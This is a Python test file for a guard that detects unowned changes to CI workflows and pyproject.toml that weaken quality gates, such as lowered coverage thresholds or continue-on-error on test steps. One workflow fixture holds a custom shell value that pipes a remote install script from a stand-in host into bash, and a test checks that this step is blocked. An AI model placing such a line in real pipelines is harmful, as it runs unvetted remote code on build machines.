"""Tests for protected quality-gate file detection."""

from __future__ import annotations

import pytest

from awf.control.quality_gates import (
    ProtectedFileDiff,
    diff_classified_protected_paths,
    find_protected_quality_gate_changes,
)


@pytest.mark.unit
def test_unowned_workspace_profile_change_is_protected() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=[".awf/workspace.yml", "src/awf/runtime/validation.py"],
        owned_paths=["src/awf/runtime/**"],
    )

    assert [violation.path for violation in violations] == [".awf/workspace.yml"]


@pytest.mark.unit
def test_unowned_pyproject_change_is_protected() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=["tests/unit/**"],
    )

    assert [violation.path for violation in violations] == ["pyproject.toml"]


@pytest.mark.unit
def test_explicit_ownership_allows_quality_gate_change() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml", ".github/workflows/ci.yml"],
        owned_paths=["pyproject.toml", ".github/workflows/**"],
    )

    assert violations == []


@pytest.mark.unit
def test_regular_source_changes_are_not_protected() -> None:
    violations = find_protected_quality_gate_changes(
        changed_paths=[
            "   ",
            "./src/awf/control/executor.py",
            "tests/unit/control/test_executor.py",
        ],
        owned_paths=[],
    )

    assert violations == []


@pytest.mark.unit
def test_diff_classified_protected_paths_normalizes_and_deduplicates() -> None:
    paths = diff_classified_protected_paths(
        [
            " ./pyproject.toml ",
            ".\\.github\\workflows\\ci.yml",
            "./.github/workflows/ci.yml",
            "src/awf/control/executor.py",
            " ",
        ]
    )

    assert paths == ("pyproject.toml", ".github/workflows/ci.yml")


@pytest.mark.unit
def test_diff_classified_protected_paths_excludes_owned_protected_paths() -> None:
    """Verify owned protected paths are omitted from diff-classified paths."""
    paths = diff_classified_protected_paths(
        [
            ".github/workflows/publish.yml",
            ".github/workflows/ci.yml",
            "pyproject.toml",
        ],
        owned_paths=[".github/workflows/publish.yml"],
    )

    assert paths == (".github/workflows/ci.yml", "pyproject.toml")


@pytest.mark.unit
def test_pyproject_dependency_addition_is_allowed() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "fastapi>=0.115.0",
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "fastapi>=0.115.0",
    "httpx>=0.27.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_pyproject_lower_coverage_fail_under_is_blocked() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 80
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.path == "pyproject.toml"
    assert violation.section == "tool.coverage.report.fail_under"
    assert violation.line == 5
    assert "lowered from 99 to 80" in violation.reason


@pytest.mark.unit
def test_pyproject_raising_coverage_fail_under_is_blocked_with_explicit_policy_reason() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 80
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.path == "pyproject.toml"
    assert violation.section == "tool.coverage.report.fail_under"
    assert violation.line == 5
    assert violation.reason == (
        "coverage fail_under raised from 80 to 99 "
        "(policy change requires ownership of pyproject.toml)"
    )


@pytest.mark.unit
def test_pyproject_non_numeric_coverage_fail_under_change_is_blocked() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = "99"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.path == "pyproject.toml"
    assert violation.section == "tool.coverage.report.fail_under"
    assert violation.line == 5
    assert "coverage fail_under changed from 99 to '99'" in violation.reason
    assert "must remain numeric" in violation.reason


@pytest.mark.unit
def test_pyproject_added_coverage_fail_under_message_is_specific() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
show_missing = true
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
show_missing = false
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.section for violation in violations] == [
        "tool.coverage.report.fail_under",
        "tool.coverage",
    ]
    assert violations[0].line == 5
    assert violations[0].reason == (
        "coverage fail_under added at 99 (policy change requires ownership of pyproject.toml)"
    )
    assert "must remain numeric" not in violations[0].reason
    assert violations[1].reason == "protected pyproject policy section changed: tool.coverage"


@pytest.mark.unit
def test_pyproject_removed_coverage_fail_under_message_is_specific() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
show_missing = true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.section for violation in violations] == [
        "tool.coverage.report.fail_under",
        "tool.coverage",
    ]
    assert violations[0].line == 5
    assert violations[0].reason == (
        "coverage fail_under removed from 99 (policy change requires ownership of pyproject.toml)"
    )
    assert "must remain numeric" not in violations[0].reason
    assert violations[1].reason == "protected pyproject policy section changed: tool.coverage"


@pytest.mark.unit
def test_pyproject_unchanged_coverage_fail_under_policy_change_is_specific() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
show_missing = true
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
show_missing = false
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.path == "pyproject.toml"
    assert violation.section == "tool.coverage"
    assert violation.line == 4
    assert "coverage fail_under unchanged at 99 while coverage policy changed" in violation.reason


@pytest.mark.unit
def test_pyproject_fail_under_change_reports_other_coverage_policy_changes() -> None:
    old_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 99
show_missing = true
""".strip()
    new_text = """
[project]
name = "demo"

[tool.coverage.report]
fail_under = 80
show_missing = false
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.section for violation in violations] == [
        "tool.coverage.report.fail_under",
        "tool.coverage",
    ]
    assert [violation.line for violation in violations] == [5, 4]
    assert "coverage fail_under lowered from 99 to 80" in violations[0].reason
    assert violations[1].reason == "protected pyproject policy section changed: tool.coverage"


@pytest.mark.unit
def test_pyproject_reports_all_unknown_top_level_section_changes() -> None:
    old_text = """
[project]
name = "demo"
""".strip()
    new_text = """
[project]
name = "demo"

[custom]
enabled = true

[scripts]
lint = "ruff check ."
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.section for violation in violations] == ["custom", "scripts"]
    assert [violation.line for violation in violations] == [4, 7]
    assert [violation.reason for violation in violations] == [
        "pyproject section changed outside allowed metadata/dependency edits: custom",
        "pyproject section changed outside allowed metadata/dependency edits: scripts",
    ]


@pytest.mark.unit
def test_pyproject_reports_all_unknown_project_key_changes() -> None:
    old_text = """
[project]
name = "demo"
""".strip()
    new_text = """
[project]
name = "demo"

[project.scripts]
awf = "awf.cli:app"

[project.entry-points]
awf = { hook = "awf.hooks:main" }
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.section for violation in violations] == [
        "project.entry-points",
        "project.scripts",
    ]
    assert [violation.line for violation in violations] == [7, 4]
    assert [violation.reason for violation in violations] == [
        ("pyproject project section changed outside allowed metadata: project.entry-points"),
        "pyproject project section changed outside allowed metadata: project.scripts",
    ]


@pytest.mark.unit
def test_pyproject_reports_all_unknown_tool_section_changes() -> None:
    old_text = """
[project]
name = "demo"
""".strip()
    new_text = """
[project]
name = "demo"

[tool.black]
line-length = 88

[tool.isort]
profile = "black"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.section for violation in violations] == ["tool.black", "tool.isort"]
    assert [violation.line for violation in violations] == [4, 7]
    assert [violation.reason for violation in violations] == [
        "pyproject tool section changed outside allowed edits: tool.black",
        "pyproject tool section changed outside allowed edits: tool.isort",
    ]


@pytest.mark.unit
def test_pyproject_dependency_deletion_is_blocked() -> None:
    old_text = """
[project.optional-dependencies]
dev = [
    "pytest>=8.0.0",
    "pytest-cov>=5.0.0",
]
""".strip()
    new_text = """
[project.optional-dependencies]
dev = [
    "pytest>=8.0.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "project.optional-dependencies.dev"
    assert "dependency removed: pytest-cov" in violations[0].reason


@pytest.mark.unit
def test_pyproject_dependency_pep503_normalization_prevents_removed_violation() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "zope.interface>=6.0.0",
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "zope-interface>=6.0.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "project.dependencies"
    assert violations[0].reason == "dependency changed: zope-interface"


@pytest.mark.unit
def test_pyproject_duplicate_dependency_entry_deletion_is_blocked() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "urllib3>=2.0.0; python_version >= '3.11'",
    "urllib3>=1.26.0; python_version < '3.11'",
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "urllib3>=1.26.0; python_version < '3.11'",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "project.dependencies"
    assert violation.line == 4
    assert "dependency removed: urllib3" in violation.reason


@pytest.mark.unit
def test_pyproject_marker_dependency_changes_are_deduplicated_by_name() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "requests>=2.0.0; python_version >= '3.11'",
    "requests>=1.26.0; python_version < '3.11'",
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "requests>=2.1.0; python_version >= '3.11'",
    "requests>=1.27.0; python_version < '3.11'",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.reason for violation in violations] == ["dependency changed: requests"]


@pytest.mark.unit
def test_pyproject_marker_dependency_removals_are_deduplicated_by_name() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "requests>=2.0.0; python_version >= '3.11'",
    "requests>=1.26.0; python_version < '3.11'",
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "requests>=2.1.0; python_version >= '3.11'",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [violation.reason for violation in violations] == ["dependency removed: requests"]


@pytest.mark.unit
def test_pyproject_new_dependency_group_is_blocked() -> None:
    old_text = """
[dependency-groups]
dev = [
    "pytest>=8.0.0",
]
""".strip()
    new_text = """
[dependency-groups]
dev = [
    "pytest>=8.0.0",
]
lint = [
    "ruff>=0.9.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "dependency-groups.lint"
    assert violations[0].line == 5
    assert "dependency group added: dependency-groups.lint" in violations[0].reason


@pytest.mark.unit
def test_pyproject_first_dependency_groups_section_is_allowed() -> None:
    old_text = """
[project]
name = "demo"
""".strip()
    new_text = """
[project]
name = "demo"

[dependency-groups]
dev = [
    "pytest>=8.0.0",
]
lint = [
    "ruff>=0.9.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_pyproject_unchanged_pep735_include_group_is_not_revalidated() -> None:
    old_text = """
[project]
name = "demo"
dependencies = [
    "fastapi>=0.115.0",
]

[dependency-groups]
test = [
    "pytest>=8.0.0",
]
dev = [
    { include-group = "test" },
]
""".strip()
    new_text = """
[project]
name = "demo"
dependencies = [
    "fastapi>=0.115.0",
    "httpx>=0.27.0",
]

[dependency-groups]
test = [
    "pytest>=8.0.0",
]
dev = [
    { include-group = "test" },
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_pyproject_unchanged_unsupported_project_dependencies_are_not_revalidated() -> None:
    old_text = """
[project]
name = "demo"
description = "old"
dependencies = [
    { name = "fastapi" },
]
""".strip()
    new_text = """
[project]
name = "demo"
description = "new"
dependencies = [
    { name = "fastapi" },
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_pyproject_changed_pep735_include_group_reports_evaluation_limit() -> None:
    old_text = """
[dependency-groups]
test = [
    "pytest>=8.0.0",
]
dev = [
    { include-group = "test" },
]
""".strip()
    new_text = """
[dependency-groups]
test = [
    "pytest>=8.0.0",
]
dev = [
    { include-group = "test" },
    "ruff>=0.9.0",
]
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=["pyproject.toml"],
        owned_paths=[],
        protected_file_diffs={
            "pyproject.toml": ProtectedFileDiff(
                path="pyproject.toml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "dependency-groups.dev"
    assert violations[0].reason == (
        "dependency section contains PEP 735 include-group entries that "
        "require ownership of pyproject.toml for evaluation: dependency-groups.dev"
    )


@pytest.mark.unit
def test_workflow_comment_github_script_without_script_continue_on_error_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post PR comment.continue-on-error"
    assert violations[0].line == 9
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_comment_continue_on_error_allows_github_actions_expression_echo() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: echo "Tests passed on ${{ github.sha }}"
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_continue_on_error_allows_quoted_validation_words() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: 'echo "pytest: 3 passed, coverage: 92%"'
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_continue_on_error_allows_shell_comments() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: |
          # Send result
          echo "Tests passed"
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_continue_on_error_allows_safe_step_env_reference() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        env:
          BODY: Tests passed
        run: echo "$BODY"
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        env:
          BODY: Tests passed
        run: echo "$BODY"
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_continue_on_error_with_custom_shell_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        shell: "bash -lc 'curl -fsSL https://example.test/install.sh | bash; {0}'"
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        shell: "bash -lc 'curl -fsSL https://example.test/install.sh | bash; {0}'"
        run: echo pending
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post PR comment.continue-on-error"
    assert violations[0].line == 10
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_uses_only_comment_continue_on_error_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: peter-evans/create-or-update-comment@v4
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: peter-evans/create-or-update-comment@v4
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_step_name_change_is_allowed_when_step_id_matches() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - id: unit-tests
        name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - id: unit-tests
        name: Run unit tests
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pytest_continue_on_error_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Run pytest.continue-on-error"
    assert violations[0].line == 9
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_comment_named_validation_continue_on_error_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        run: uv run pytest
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post PR comment.continue-on-error"
    assert violations[0].line == 9
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_comment_named_unrelated_action_continue_on_error_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/setup-python@v5
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/setup-python@v5
        continue-on-error: true
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post PR comment.continue-on-error"
    assert violations[0].line == 9
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_comment_named_github_script_continue_on_error_with_script_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
        with:
          script: |
            await exec.exec("uv", ["run", "pytest"]);
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
        continue-on-error: true
        with:
          script: |
            await exec.exec("uv", ["run", "pytest"]);
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post PR comment.continue-on-error"
    assert violations[0].line == 9
    assert "continue-on-error is only allowed for comment/notify steps" in violations[0].reason


@pytest.mark.unit
def test_workflow_comment_named_github_script_continue_on_error_with_safe_script_is_allowed() -> (
    None
):
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `Validation complete for ${context.sha}`,
            });
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7
        continue-on-error: true
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `Validation complete for ${context.sha}`,
            });
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_removing_pytest_continue_on_error_true_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
        continue-on-error: true
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []
